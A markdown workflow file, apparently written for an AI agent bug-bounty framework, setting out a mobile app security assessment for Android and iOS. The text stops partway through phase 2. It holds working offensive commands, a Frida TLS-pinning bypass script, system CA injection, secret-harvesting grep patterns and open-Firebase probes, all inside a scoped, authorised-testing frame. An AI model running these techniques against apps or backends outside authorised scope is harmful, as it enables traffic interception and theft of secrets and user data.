---
name: W_HUNT_MOBILE
description: Mobile application security assessment for Android and iOS (MASVS/MASTG)
trigger: APK file, IPA file, or mobile app store URL detected
agents: [AppReviewAgent, AndroidAgent, iOSAgent, ReverseEngineeringAgent, APIAgent, AuthAgent, OAuthAgent, IDORAgent, SSRFAgent, SecretsExposureAgent, SQLiAgent, ValidatorAgent, ExploitChainAgent]
tools: [appium-harness, burp-bridge, credential-vault, auth-manager, agent-router, hunt-orchestrator]
skills_invoked: [MobileSecurity]
---

# W_HUNT_MOBILE — Mobile Application Security Assessment Workflow

> End-to-end, MASVS/MASTG-aligned methodology for Android and iOS. The workflow runs three concurrent tracks once profiling is done: an **Android platform track**, an **iOS platform track**, and a **shared backend track** that re-routes the app's server API into the API methodology — because that is where the overwhelming majority of mobile bounties actually pay out. Every technique is hypothesis-driven, proxied through Burp, and writes evidence to the run output directory.
>
> Authoritative references: OWASP MASVS v2 (MASVS-STORAGE / CRYPTO / AUTH / NETWORK / PLATFORM / CODE / RESILIENCE), OWASP MASTG v2 test groups, OWASP API Security Top 10 (for the backend track), CWE.

---

## Operating Doctrine

The mindset a senior mobile tester brings to every engagement. These principles override convenience at every step.

- **Understand before you attack.** The app is the *client*. Read the manifest/Info.plist, decompile, map every exported edge and every network call, and build an AppProfile *first*. A payload fired before you understand the trust boundary is noise.
- **Hypothesis-driven, not scattershot.** Each technique below states the bug class it targets and why a senior tester probes there. Run the profile step, form a hypothesis, then test it. Record negative results too — they shape later phases.
- **Proxy everything.** All HTTP(S), all tool traffic, and all instrumented app traffic route through Burp (`http://127.0.0.1:8080`, listening on all interfaces so the device can reach it). Use a real mobile browser User-Agent for any direct fetch. If a request is not in Burp history, it did not happen for reporting purposes.
- **The client is a lie; the server is the truth.** Client-side controls (feature flags, premium gates, root/jailbreak detection, even "encryption") are bypassable by definition once you own the runtime. The durable, high-payout bugs live server-side (BOLA/IDOR, broken auth, mass assignment, SSRF). Use the client to *discover* the API, then attack the API hard.
- **Evidence capture is non-negotiable.** Every positive gets a reproducible artifact: a Frida script, a `curl`/`adb`/`drozer` one-liner, a HAR export, a screenshot, a DB dump. No artifact, no finding.
- **Scope discipline.** Test only the in-scope package/bundle and its in-scope backend hosts. Third-party SDKs, ad networks, analytics endpoints, and shared infrastructure are out of scope unless explicitly listed. The hard scope guard in Pre-Flight aborts on violation.
- **Depth vs breadth.** Breadth first across all seven MASVS groups (the Coverage Matrix guarantees nothing is skipped), then depth on whatever shows blood — pinning that falls trivially, an exported provider that answers, a token that never expires, a `addJavascriptInterface` bridge.
- **Two identities, always.** Where the app has accounts, instrument with a low-privilege identity and an admin/second-user identity in parallel so access-control bugs surface immediately rather than as an afterthought.

---

## Workflow Trigger Conditions

The hunt orchestrator dispatches this workflow when any of the following is true:

- APK artifact path (`.apk`, `.xapk`, `.apks`, `.aab`)
- IPA artifact path (`.ipa`)
- App store URL (Google Play `play.google.com/...` or Apple `apps.apple.com/...`)
- Target config with `platform: android | ios | mobile`

```bash
# Orchestrator dispatch + state init (engagement 'mobile' routes both platforms + backend)
bun ~/.claude/skills/BugBountyFramework/Tools/hunt-orchestrator.ts \
  --target "$TARGET" --workflow "W_HUNT_MOBILE"

# Deterministic agent deployment plan for this engagement
bun ~/.claude/skills/BugBountyFramework/Tools/agent-router.ts --engagement mobile
```

### Dispatch map (engagement `mobile`)

The router resolves this engagement to dependency-ordered groups (profile -> platform -> backend -> native -> validate -> chain). Agents inside a group run in parallel; groups run sequentially.

| Router phase | Agents (parallel) | Owns |
|--------------|-------------------|------|
| UNDERSTAND | AppReviewAgent | App profiling, attack-surface map, AppProfile artifact |
| PLATFORM | AndroidAgent, iOSAgent | Per-platform static + dynamic (storage, crypto, IPC, pinning) |
| BACKEND | APIAgent, AuthAgent, OAuthAgent, IDORAgent, SSRFAgent, SecretsExposureAgent | The server API — where most bounties land |
| NATIVE | ReverseEngineeringAgent | `.so` / `.dylib` / Mach-O native logic, only if present |
| VALIDATE | ValidatorAgent | Reproduce, de-dup by root cause, CVSS, hunt-mode gate |
| CHAIN | ExploitChainAgent | Correlate validated findings into kill chains, elevate combined CVSS |

Content-provider SQL injection / path traversal found in PLATFORM is handed to **SQLiAgent** (provider injection) and **PathTraversalAgent** is not in this engagement's roster — provider traversal is owned by **AndroidAgent** and confirmed by **ValidatorAgent**.

---

## Pre-Flight

Run once before Phase 0. Nothing proceeds until these pass.

### P.1 Environment + artifact directories

```bash
# --- Identity of the target ---
export TARGET="com.target.app"          # Android package id OR iOS bundle id
export TARGET_SLUG="com.target.app"
export PLATFORM="mobile"                 # android | ios | mobile

# --- Run output directory (single source of truth for all artifacts) ---
export SESSION_DIR=~/.claude/MEMORY/BugBounty/Sessions/${TARGET_SLUG}
export ARTIFACTS_DIR=$SESSION_DIR/artifacts   # acquired APK/IPA, decompiled trees
export STATIC_DIR=$SESSION_DIR/static         # jadx/apktool/class-dump output
export DYNAMIC_DIR=$SESSION_DIR/dynamic       # Frida logs, objection dumps
export STORAGE_DIR=$SESSION_DIR/storage       # pulled prefs/DBs/files/keychain
export HAR_DIR=$SESSION_DIR/har               # Burp HAR + endpoint lists
export FINDINGS_DIR=$SESSION_DIR/findings     # one JSON per finding
export EVIDENCE_DIR=$SESSION_DIR/evidence     # screenshots, PoC clips
mkdir -p "$ARTIFACTS_DIR" "$STATIC_DIR" "$DYNAMIC_DIR" "$STORAGE_DIR" \
         "$HAR_DIR" "$FINDINGS_DIR" "$EVIDENCE_DIR"

# --- Tool paths ---
export TOOLS=~/.claude/skills/BugBountyFramework/Tools

# --- Proxy: Burp listens on all interfaces; device routes to host LAN IP:8080 ---
export PROXY="http://127.0.0.1:8080"
export PROXY_HOST=$(ipconfig getifaddr en0 2>/dev/null || hostname -I | awk '{print $1}')
export PROXY_PORT=8080

# --- Browser User-Agent for any direct fetch (well-known files, store pages) ---
export UA="Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Mobile Safari/537.36"

# --- Device handles ---
export DEVICE_ANDROID="emulator-5554"   # adb -s ; rooted emulator or test device
export IOS_UDID=$(idevice_id -l 2>/dev/null | head -1)   # jailbroken test device
```

### P.2 Burp proxy wiring + scope

```bash
# Burp reachable? (warn, do not hard-block — degrade to mitmproxy if needed)
bun $TOOLS/burp-bridge.ts --health

# Push the engagement scope into Burp so out-of-scope hosts are never touched.
# Scope = the app's in-scope backend hosts ONLY (never analytics/ad/SDK CDNs).
bun $TOOLS/burp-bridge.ts --sync-scope --scope "api.target.com,*.target.com,target.com"

# Confirm the proxy is actually intercepting from this host
curl -s -x "$PROXY" -A "$UA" https://example.com/ -o /dev/null -w "proxy_ok=%{http_code}\n" -k
```

### P.3 Vault-loaded credentials + multi-identity

```bash
# NEVER inline secrets. Pull test accounts from the encrypted vault.
bun $TOOLS/credential-vault.ts --get --target "$TARGET_SLUG"

# Establish two identities for access-control testing:
#   low-priv  user  -> $TOKEN_LOW
#   admin/2nd user  -> $TOKEN_HIGH
# auth-manager drives the login flow and persists session/storage state.
bun $TOOLS/auth-manager.ts --target "$TARGET" --detect-strategy
```

Token values are captured live during Phase 3 (network analysis) and Phase 6 (auth) and referenced as `$TOKEN_LOW` / `$TOKEN_HIGH` — never written into this file or committed.

### P.4 Hard scope guard

```bash
# Abort the run immediately if the resolved backend host is out of scope.
scope_guard() {
  local host="$1"
  if ! bun $TOOLS/hunt-orchestrator.ts --target "$host" --scope-check | grep -q IN_SCOPE; then
    echo "[SCOPE-GUARD] $host is OUT OF SCOPE — aborting." >&2
    return 1
  fi
}
# Example: scope_guard api.target.com || exit 1
```

### Pre-Flight gate-out
Burp alive and intercepting from this host; scope synced and guarded; at least one credential set loaded; artifact directories created; device/emulator reachable (`adb devices` shows the Android device, `idevice_id -l` shows the iOS device). Only then start Phase 0.

---

## Coverage Matrix — MASVS/MASTG control groups -> phase/technique

Every authoritative MASVS v2 control group and its concrete checklist items are mapped to the phase/technique that covers it. Nothing in the matrix is uncovered.

| MASVS group | Concrete control / checklist item | Phase.Technique |
|-------------|-----------------------------------|-----------------|
| MASVS-STORAGE | Insecure local storage (prefs / NSUserDefaults / plist) | 4.A |
| MASVS-STORAGE | SQLite / Realm / Core Data sensitive data | 4.B |
| MASVS-STORAGE | Files in internal/external storage, world-readable | 4.C |
| MASVS-STORAGE | Application logs leaking secrets | 4.D |
| MASVS-STORAGE | Keyboard cache / autofill / dictation residue | 4.E |
| MASVS-STORAGE | Pasteboard / clipboard exposure | 4.F, 7.G |
| MASVS-STORAGE | Backups (adb backup, iTunes/iCloud, auto-backup) | 4.G |
| MASVS-STORAGE | Screenshot / task-switcher snapshot leakage | 4.H |
| MASVS-CRYPTO | Weak / deprecated algorithms (DES, RC4, MD5, ECB) | 5.A |
| MASVS-CRYPTO | Hardcoded / predictable keys, static IVs | 5.B |
| MASVS-CRYPTO | KeyStore / Keychain / Data Protection misuse | 5.C |
| MASVS-CRYPTO | Weak randomness (non-CSPRNG) | 5.D |
| MASVS-AUTH | Local authentication / PIN handling | 6.A |
| MASVS-AUTH | Biometric bypass (BiometricPrompt / LAContext) | 6.B |
| MASVS-AUTH | Token handling, storage, leakage | 6.C |
| MASVS-AUTH | Session management (fixation, expiry, rotation, logout) | 6.D |
| MASVS-NETWORK | TLS validation / trust manager weaknesses | 3.A, 2.C |
| MASVS-NETWORK | Certificate / public-key pinning (presence + bypass) | 1.D, 2.C |
| MASVS-NETWORK | Cleartext traffic (HTTP), mixed content | 3.D |
| MASVS-NETWORK | network_security_config / ATS exceptions | 1.A, 3.D |
| MASVS-PLATFORM | Exported activities / services / receivers / providers | 1.A, 7.A |
| MASVS-PLATFORM | Content provider SQLi & path traversal | 7.B |
| MASVS-PLATFORM | Deep links / App Links / Universal Links hijack | 7.C |
| MASVS-PLATFORM | Intent redirection / pending-intent abuse | 7.D |
| MASVS-PLATFORM | WebView JS bridge (addJavascriptInterface) & RCE | 7.E |
| MASVS-PLATFORM | iOS URL scheme / custom scheme hijack | 7.F |
| MASVS-PLATFORM | Pasteboard / general-pasteboard cross-app leakage | 7.G |
| MASVS-CODE | Injection *into* the app (intent/URL/IPC-borne) | 7.A, 7.B, 7.E |
| MASVS-CODE | Memory-safety bugs in native code | 9.A, 9.B |
| MASVS-CODE | Outdated / vulnerable third-party libs | 1.F |
| MASVS-RESILIENCE | Root / jailbreak detection (presence + bypass) | 8.A |
| MASVS-RESILIENCE | Anti-debugging / anti-hooking | 8.B |
| MASVS-RESILIENCE | Code obfuscation / string protection | 1.E, 8.C |
| MASVS-RESILIENCE | Pinning resistance to bypass / runtime integrity | 8.D |
| MASVS-RESILIENCE | Attestation (SafetyNet / Play Integrity / DeviceCheck) | 8.D |
| Backend (API Top 10) | Auth, BOLA/IDOR, SSRF, mass assignment, secrets | Phase 10 |

---

## Phase 0: PROFILING & ACQUISITION

**Objective:** Acquire the artifact(s) and produce an AppProfile that maps the entire attack surface before a single payload fires.
**Expert rationale:** Profile-before-attack. The decompiled manifest and the first hour of traffic tell you which of the seven MASVS groups are even reachable, where the real backend lives, and whether native/packing will gate static analysis. Every later phase's hypotheses are seeded here.
**Gate-in:** Pre-Flight passed.

### 0.A Artifact acquisition

**Objective / hypothesis:** Get a clean, analyzable APK/IPA. Store-distributed iOS binaries are FairPlay-encrypted and must be decrypted on a jailbroken device before Mach-O analysis is meaningful.

**Procedure:**
```bash
# Android: pull the installed APK (handles split APKs / app bundles)
adb -s "$DEVICE_ANDROID" shell pm path "$TARGET" | sed 's/package://' | while read p; do
  adb -s "$DEVICE_ANDROID" pull "$p" "$ARTIFACTS_DIR/"
done
# Merge splits if present (universal APK) with apkeditor or bundletool, else use base.apk
export APK="$ARTIFACTS_DIR/base.apk"

# iOS: decrypt the App Store binary on a jailbroken device, then pull the IPA
# (frida-ios-dump dumps the decrypted Mach-O and repackages an IPA)
frida-ios-dump -u "$IOS_UDID" "$TARGET" -o "$ARTIFACTS_DIR/target.ipa"
export IPA="$ARTIFACTS_DIR/target.ipa"

# Record what offensive tooling is available for this engagement
piranha tools mobile
```

**Indicators:** A decompilable APK; an IPA whose `Payload/*.app/<bin>` has `cryptid 0` (`otool -l` / `LC_ENCRYPTION_INFO_64`).
**Validation:** `unzip -l "$APK"` lists `classes*.dex` + `AndroidManifest.xml`; `otool -arch arm64 -l <ios-bin> | grep -A4 LC_ENCRYPTION_INFO` shows `cryptid 0` after decrypt.
**Evasion / edge cases:** Split/obb-backed apps need all splits; Play-signed apps need `bundletool` to build a universal APK; iOS apps with multiple slices need the device-matching slice; some apps ship Flutter/React-Native bundles (`libapp.so` / `index.android.bundle`) handled in 1.F.
**Severity:** N/A (enabling step).
**Dispatch:** -> AppReviewAgent

### 0.B AppProfile generation

**Objective / hypothesis:** Build the structured attack-surface map (platform, min/target SDK, components, permissions, network endpoints seen so far, frameworks, native libs, anti-tamper presence). Everything downstream reads this.

**Procedure:**
```bash
# Quick automated triage of the platform surface through the proxy.
# appium-harness implements Android exported-component/deep-link/storage/pinning
# triage directly; for iOS it prints the objection/frida bootstrap.
bun $TOOLS/appium-harness.ts --platform android --apk "$APK" \
  --proxy "$PROXY" --device "$DEVICE_ANDROID" \
  --output "$STATIC_DIR/appium-android-triage.json"

# Seed the structured profile
cat > "$ARTIFACTS_DIR/AppProfile.json" <<'JSON'
{ "package": "", "platform": "", "minSdk": null, "targetSdk": null,
  "components": {"activities": [], "services": [], "receivers": [], "providers": []},
  "exported": [], "permissions": [], "deeplinks": [], "endpoints": [],
  "frameworks": [], "nativeLibs": [], "antiTamper": [], "backendHosts": [] }
JSON
```

**Indicators:** A populated AppProfile naming the backend host(s), the exported edges, and whether native/anti-tamper exists.
**Validation:** Cross-check the profile's `backendHosts` against Burp scope (P.2) and the scope guard (P.4).
**Severity:** N/A.
**Dispatch:** -> AppReviewAgent

**Phase artifacts:** `AppProfile.json`, `appium-android-triage.json`, acquired APK/IPA in `$ARTIFACTS_DIR`.
**Gate-out:** AppProfile lists platform, all components with exported flags, permissions, and at least one backend host. Native/anti-tamper presence flagged.

---

## Phase 1: STATIC ANALYSIS

**Objective:** Decompile and statically map the manifest/plist attack surface, secrets, crypto usage, pinning, obfuscation, native presence, and cloud config.
**Expert rationale:** Static analysis is cheap and complete — it sees every code path, not just the ones you exercise. It produces the exact targets (component names, schemes, provider authorities, endpoints, KeyStore aliases) the dynamic phases will hit.
**Gate-in:** Phase 0 complete; artifact decompilable.
**Parallelizable:** Android and iOS sub-tracks run independently; secrets/crypto/pinning scans run in parallel within each.

### 1.A Manifest / Info.plist attack-surface extraction

**Objective / hypothesis:** Enumerate every exported component, permission, deep link, backup/debuggable flag, and network config. Exported edges + cleartext config are the highest-density platform bugs (MASVS-PLATFORM, MASVS-NETWORK).

**Procedure (Android):**
```bash
apktool d "$APK" -o "$STATIC_DIR/apktool" -f
jadx "$APK" -d "$STATIC_DIR/jadx" --deobf --show-bad-code 2>"$STATIC_DIR/jadx.err"

MAN="$STATIC_DIR/apktool/AndroidManifest.xml"
# aapt gives a normalized component/permission/launchable view
aapt dump badging "$APK" | tee "$STATIC_DIR/aapt-badging.txt"
aapt dump xmltree "$APK" AndroidManifest.xml > "$STATIC_DIR/manifest-tree.txt"

# Exported components (explicit + implicit-by-intent-filter)
grep -nE 'exported="true"' "$MAN" | tee "$STATIC_DIR/exported.txt"
grep -nE '<activity |<service |<receiver |<provider ' "$MAN"
# Implicitly-exported pre-target31 components that declare an intent-filter
grep -nB2 -A8 '<intent-filter' "$MAN" | tee "$STATIC_DIR/intent-filters.txt"

# Dangerous flags + network posture
grep -nE 'allowBackup|debuggable|usesCleartextTraffic|networkSecurityConfig|android:minSdkVersion|targetSdkVersion' "$MAN"
cat "$STATIC_DIR/apktool/res/xml/network_security_config.xml" 2>/dev/null \
  | tee "$STATIC_DIR/network_security_config.xml"

# Permissions (flag dangerous + custom)
grep -nE '<uses-permission|<permission ' "$MAN" | tee "$STATIC_DIR/permissions.txt"

# Deep link / App Link surface
grep -nE 'android:scheme|android:host|android:pathPrefix|android:autoVerify' "$MAN" \
  | tee "$STATIC_DIR/deeplinks.txt"
```

**Procedure (iOS):**
```bash
unzip -o "$IPA" -d "$STATIC_DIR/ipa" >/dev/null
APP=$(ls -d "$STATIC_DIR/ipa/Payload/"*.app | head -1)
plutil -p "$APP/Info.plist" | tee "$STATIC_DIR/info-plist.txt"
# URL schemes + universal-link associated domains
plutil -p "$APP/Info.plist" | grep -A8 'CFBundleURLSchemes'
# App Transport Security exceptions (cleartext / weak TLS allowances)
plutil -p "$APP/Info.plist" | grep -A30 'NSAppTransportSecurity' | tee "$STATIC_DIR/ats.txt"
# Entitlements (keychain access groups, associated domains, app groups)
codesign -d --entitlements :- "$APP" 2>/dev/null | tee "$STATIC_DIR/entitlements.plist"
# Objective-C class surface
class-dump -H "$APP/$(basename "$APP" .app)" -o "$STATIC_DIR/headers" 2>/dev/null
```

**Indicators:** `exported="true"` on activities/services/receivers/providers; `allowBackup="true"`; `debuggable="true"`; `usesCleartextTraffic="true"` or no/weak `network_security_config`; ATS `NSAllowsArbitraryLoads true`; `autoVerify` missing on App Links; custom URL schemes; broad keychain `access-groups`.
**Validation:** Confirm exported reachability dynamically in 7.A (an exported flag without a reachable handler is informational). Confirm cleartext actually occurs in 3.D.
**Evasion / edge cases:** `targetSdk >= 31` requires explicit `android:exported`; components with `<intent-filter>` on older targets are implicitly exported; `provider` `grantUriPermissions`/`<grant-uri-permission>` widens reach; manifest `<meta-data>` can carry API keys.
**Severity:** Per finding; exported provider/service with sensitive action = High; debuggable production build = High (CVSS ~7.x); cleartext allowed = Medium-High.
**Dispatch:** -> AndroidAgent / iOSAgent (component findings), -> AppReviewAgent (surface map).

### 1.B Hardcoded secrets & sensitive data

**Objective / hypothesis:** Static keys/tokens/endpoints leak constantly in mobile builds (resources, BuildConfig, strings.xml, .so rodata, plist). A live production key is an instant Critical.

**Procedure:**
```bash
# Source + resource secrets (Android)
grep -rniE '(api[_-]?key|api[_-]?secret|client[_-]?secret|password|passwd|bearer|authorization|token|aws_(access|secret)|s3\.amazonaws|firebase|stripe|sk_live|AIza[0-9A-Za-z_-]{35}|xox[baprs]-)' \
  "$STATIC_DIR/jadx" "$STATIC_DIR/apktool/res" 2>/dev/null \
  | tee "$STATIC_DIR/secrets-grep.txt"

# Endpoints (drop google/android infra noise)
grep -rhoE 'https?://[A-Za-z0-9._/%-]+' "$STATIC_DIR/jadx/sources" 2>/dev/null \
  | grep -vE 'schemas.android.com|googleapis.com|android.com|gstatic.com' \
  | sort -u | tee "$HAR_DIR/static-endpoints.txt"

# Embedded crypto material
find "$STATIC_DIR" \( -name '*.pem' -o -name '*.p12' -o -name '*.jks' -o -name '*.bks' \
  -o -name '*.keystore' -o -name '*.key' \) -print

# Native rodata strings
for so in $(find "$STATIC_DIR/apktool/lib" -name '*.so' 2>/dev/null); do
  strings -n 8 "$so" | grep -iE 'http|api|key|secret|token|password' >> "$STATIC_DIR/native-strings.txt"
done

# iOS: strings + plists in the bundle
strings -n 8 "$APP/$(basename "$APP" .app)" | grep -iE 'http|key|secret|token' \
  > "$STATIC_DIR/ios-strings.txt"
```

**Indicators:** `sk_live_…`, `AIza…`, AWS `AKIA…`, JWTs, basic-auth blobs, private keys, non-public backend URLs.
**Validation:** Test the key out-of-band against its service with a benign call (proxied). A *test/sandbox* key is Low; a *production* key is Critical. Confirm the endpoint resolves and is in scope before probing.
**Evasion / edge cases:** Keys are often split/obfuscated/XOR'd and reassembled at runtime — if static fails, hook the decrypt routine in Phase 5/9; check `assets/`, `res/raw`, `BuildConfig.smali`, and `.so` rodata; React-Native secrets hide in `index.android.bundle`.
**Severity:** Production secret with privileged scope = Critical (CVSS 9.x). Read-only third-party key = Medium.
**Dispatch:** -> SecretsExposureAgent

### 1.C Cloud / Firebase / backend misconfig from static config

**Objective / hypothesis:** Mobile apps ship cloud config (`google-services.json`, Firebase DB URL, S3 buckets). Open Firebase RTDB/Firestore and public buckets are recurring high-impact bounties.

**Procedure:**
```bash
find "$STATIC_DIR" -name 'google-services.json' -o -name 'GoogleService-Info.plist' -print \
  -exec cat {} \;
FB=$(grep -rhoE 'https://[a-z0-9-]+\.firebaseio\.com' "$STATIC_DIR" | sort -u | head -1)

# Open Firebase RTDB test (proxied, browser UA)
[ -n "$FB" ] && curl -s -x "$PROXY" -A "$UA" "$FB/.json?print=pretty" -k \
  | tee "$HAR_DIR/firebase-root.json"

# S3 buckets referenced in code
grep -rhoE '[a-z0-9.-]+\.s3[.-][a-z0-9-]*\.amazonaws\.com|s3://[a-z0-9.-]+' "$STATIC_DIR" \
  | sort -u | tee "$HAR_DIR/s3-buckets.txt"
```

**Indicators:** Firebase `/.json` returns data instead of `Permission denied`; `s3 ls`/anonymous GET on a referenced bucket lists objects.
**Validation:** Re-fetch with no auth and confirm sensitive records; for S3 confirm `s3:GetObject`/`ListBucket` anonymously. Scope-guard the host first.
**Evasion / edge cases:** Firestore needs the REST `documents` endpoint; some RTDBs allow read but not list — try known paths from the app; storage buckets at `firebasestorage.googleapis.com/v0/b/<bucket>/o`.
**Severity:** Open RTDB/Firestore/bucket with PII = Critical (CVSS 9.x).
**Dispatch:** -> SecretsExposureAgent, -> SSRFAgent (if the app proxies cloud calls), backend follow-up in Phase 10.

### 1.D Certificate pinning detection (presence)

**Objective / hypothesis:** Determine whether pinning exists and which mechanism, so Phase 2 can pick the right bypass. Pinning *presence* is a control, not a bug; pinning *bypassable trivially* is a MASVS-RESILIENCE finding.

**Procedure:**
```bash
grep -rnE 'CertificatePinner|sha256/|certificatePinner|setCertificatePinner' "$STATIC_DIR/jadx/sources"
grep -rnE 'X509TrustManager|checkServerTrusted|TrustManagerImpl|HostnameVerifier|setHostnameVerifier' "$STATIC_DIR/jadx/sources"
grep -nA12 '<pin-set' "$STATIC_DIR/network_security_config.xml" 2>/dev/null
# iOS pinning frameworks
grep -rnE 'TrustKit|SecTrustEvaluate|SecPolicyCreateSSL|URLSession(:didReceive|.*Challenge)' "$STATIC_DIR/headers" 2>/dev/null
# Flutter pinning lives in libflutter / Dart — note for Phase 2 (needs ProxyDroid + reFlutter)
find "$STATIC_DIR/apktool/lib" -name 'libflutter.so' -print
```

**Indicators:** Presence of any pinner/trust-manager/`<pin-set>`/TrustKit reference; Flutter binary present (needs special bypass).
**Validation:** Confirmed dynamically in 2.C (does traffic flow after bypass?).
**Severity:** Informational at this step.
**Dispatch:** -> AndroidAgent / iOSAgent.

### 1.E Obfuscation & string protection assessment

**Objective / hypothesis:** Gauge how much static analysis you can trust. Heavy obfuscation pushes work into Phase 9 runtime/native; *absence* of obfuscation on a high-value app is itself a MASVS-RESILIENCE finding.

**Procedure:**
```bash
ls "$STATIC_DIR/apktool/original/META-INF/" 2>/dev/null | grep -i proguard
# Symbol entropy: lots of a/b/c single-letter classes => R8/ProGuard active
find "$STATIC_DIR/jadx/sources" -name '*.java' | sed 's#.*/##' | grep -cE '^[a-z]{1,2}\.java$'
grep -rnE 'decrypt|deobfuscate|StringFog|xor|Base64.decode' "$STATIC_DIR/jadx/sources" | head
```

**Indicators:** ProGuard mapping present; mass single-letter symbols; runtime string-decrypt routines.
**Validation:** N/A.
**Severity:** Missing obfuscation/anti-tamper on a security-sensitive app = Low-Medium (MASVS-RESILIENCE).
**Dispatch:** -> ReverseEngineeringAgent (if string decryption blocks analysis).

### 1.F Third-party / native library inventory (MASVS-CODE)

**Objective / hypothesis:** Outdated SDKs and vulnerable native libs (OpenSSL/zlib/curl) carry known CVEs.

**Procedure:**
```bash
# Java/Kotlin deps from smali package roots + bundled jars
ls "$STATIC_DIR/jadx/sources" | sort | tee "$STATIC_DIR/package-roots.txt"
# Native libs + embedded version strings
for so in $(find "$STATIC_DIR/apktool/lib" -name '*.so'); do
  echo "== $so =="; readelf -p .comment "$so" 2>/dev/null;
  strings "$so" | grep -iE 'OpenSSL [0-9]|BoringSSL|zlib [0-9]|libcurl/[0-9]|version [0-9]'
done | tee "$STATIC_DIR/native-versions.txt"
```

**Indicators:** OpenSSL < patched, vulnerable image/parsing libs, abandoned SDKs.
**Validation:** Map the version string to a known CVE; confirm the vulnerable code path is reachable from the app.
**Severity:** Per CVE; reachable RCE-class native CVE = Critical.
**Dispatch:** -> ReverseEngineeringAgent, -> SupplyChainAgent is not in roster — handled by ReverseEngineeringAgent + ValidatorAgent.

**Phase artifacts:** `jadx/`, `apktool/`, `headers/`, `secrets-grep.txt`, `static-endpoints.txt`, `network_security_config.xml`, `ats.txt`, `entitlements.plist`, `native-versions.txt`, updated `AppProfile.json`.
**Gate-out:** Full exported-component list, deep-link/scheme inventory, secrets list, pinning mechanism identified, native/obfuscation posture known, backend endpoints harvested.

---

## Phase 2: DYNAMIC INSTRUMENTATION SETUP

**Objective:** Stand up an instrumented, intercepted runtime: device, CA trust, Frida/objection, pinning bypass, root/jailbreak bypass, anti-debug bypass, and both identities installed.
**Expert rationale:** Nothing dynamic is observable until traffic decrypts and the runtime is controllable. Get this perfect once; every later phase depends on it.
**Gate-in:** Phase 1 identified the pinning mechanism and anti-tamper presence.

### 2.A Device prep & install

**Procedure:**
```bash
# Android
adb -s "$DEVICE_ANDROID" devices
adb -s "$DEVICE_ANDROID" shell getprop ro.build.version.release
adb -s "$DEVICE_ANDROID" install -r -g "$APK"   # -g grants runtime perms
frida-ps -U >/dev/null && echo "frida-server up"   # ensure frida-server running on device

# iOS (jailbroken)
ideviceinstaller -u "$IOS_UDID" -i "$IPA"
frida-ps -U | grep -i "$(basename "$APP" .app)"
```
**Indicators:** App launches under Frida (`frida-ps -Uai`).
**Dispatch:** -> AndroidAgent / iOSAgent.

### 2.B Proxy + CA trust

**Objective / hypothesis:** Force the app's HTTPS through Burp. On Android 7+ user CAs are not trusted by apps — must inject a *system* CA (or patch `network_security_config`).

**Procedure (Android):**
```bash
# Point device traffic at Burp on the host LAN IP
adb -s "$DEVICE_ANDROID" shell settings put global http_proxy "$PROXY_HOST:$PROXY_PORT"

# Export Burp CA, convert, install as a SYSTEM CA (rooted)
# (download once from http://burp/cert via the proxied browser, save as burp.der)
openssl x509 -inform DER -in "$ARTIFACTS_DIR/burp.der" -out "$ARTIFACTS_DIR/burp.pem"
H=$(openssl x509 -inform PEM -subject_hash_old -in "$ARTIFACTS_DIR/burp.pem" | head -1)
adb -s "$DEVICE_ANDROID" push "$ARTIFACTS_DIR/burp.pem" "/sdcard/${H}.0"
adb -s "$DEVICE_ANDROID" shell su -c \
  "mount -o rw,remount /system 2>/dev/null; \
   cp /sdcard/${H}.0 /system/etc/security/cacerts/ && chmod 644 /system/etc/security/cacerts/${H}.0"
# Android 14: use the APEX conscrypt path (/apex/com.android.conscrypt/cacerts) via Magisk module
```

**Procedure (iOS):**
```bash
# Set HTTP proxy in Wi-Fi settings to $PROXY_HOST:$PROXY_PORT, then:
# Safari -> http://$PROXY_HOST:$PROXY_PORT/cert -> install profile
# Settings -> General -> About -> Certificate Trust Settings -> enable full trust for PortSwigger CA
```

**Indicators:** Proxied HTTPS to the backend shows decrypted requests in Burp history.
**Validation:** `bun $TOOLS/burp-bridge.ts --history --filter "host:target.com" | head` returns app requests.
**Evasion / edge cases:** Some flows ignore the global proxy (raw sockets, gRPC, Flutter) — use a transparent gateway (e.g., `rethinking`/`PCAPdroid`/iptables redirect) or a transparent VPN; gRPC needs Burp gRPC + protobuf.
**Severity:** N/A.
**Dispatch:** -> AndroidAgent / iOSAgent.

### 2.C SSL/TLS pinning bypass

**Objective / hypothesis:** Defeat pinning so app-to-backend traffic is observable. A pinning implementation that falls to a generic Frida script is a MASVS-RESILIENCE finding.

**Procedure:**
```bash
# Fast path: objection
objection -g "$TARGET" explore -q \
  -c "android sslpinning disable" -c "ios sslpinning disable" 2>&1 | tee "$DYNAMIC_DIR/objection-pinning.log"

# Robust path: comprehensive Frida bypass (TrustManagerImpl + OkHttp + custom + ATS)
cat > "$DYNAMIC_DIR/ssl_bypass.js" <<'JS'
Java.perform(function () {
  try {
    var TMI = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    TMI.verifyChain.implementation = function (uc, tac, host, ca, ocsp, sct) {
      console.log('[ssl] TrustManagerImpl bypass: ' + host); return uc;
    };
  } catch (e) {}
  try {
    var CP = Java.use('okhttp3.CertificatePinner');
    CP.check.overload('java.lang.String', 'java.util.List').implementation =
      function (h, p) { console.log('[ssl] OkHttp pin bypass: ' + h); };
  } catch (e) {}
  var X = Java.use('javax.net.ssl.X509TrustManager');
  var SC = Java.use('javax.net.ssl.SSLContext');
  var TM = Java.registerClass({ name: 'dev.hax.TM', implements: [X], methods: {
    checkClientTrusted: function () {}, checkServerTrusted: function () {},
    getAcceptedIssuers: function () { return []; } } });
  var init = SC.init.overload('[Ljavax.net.ssl.KeyManager;','[Ljavax.net.ssl.TrustManager;','java.security.SecureRandom');
  init.implementation = function (km, tm, sr) { return init.call(this, km, [TM.$new()], sr); };
});
JS
frida -U -f "$TARGET" -l "$DYNAMIC_DIR/ssl_bypass.js" -o "$DYNAMIC_DIR/frida-ssl.log" --no-pause

# Flutter apps: pinning + proxy-awareness live in libflutter — patch with reFlutter or
# hook BoringSSL ssl_verify in libflutter.so (Phase 9 native hooking).
```

**Indicators:** After bypass, backend HTTPS appears decrypted in Burp; bypass log lines fire.
**Validation:** Without bypass traffic stalls/`SSLPeerUnverified`; with bypass it flows. Save both states as evidence of bypassability.
**Evasion / edge cases:** Multi-layer pinning (OkHttp + native), TrustKit on iOS (`objection ios sslpinning disable` or hook `TSKPinningValidator`), Cronet/QUIC pins in `.so`, gRPC channel credentials.
**Severity:** Pinning trivially bypassable = Low-Medium (MASVS-RESILIENCE); *absence* of pinning on sensitive flows = Medium.
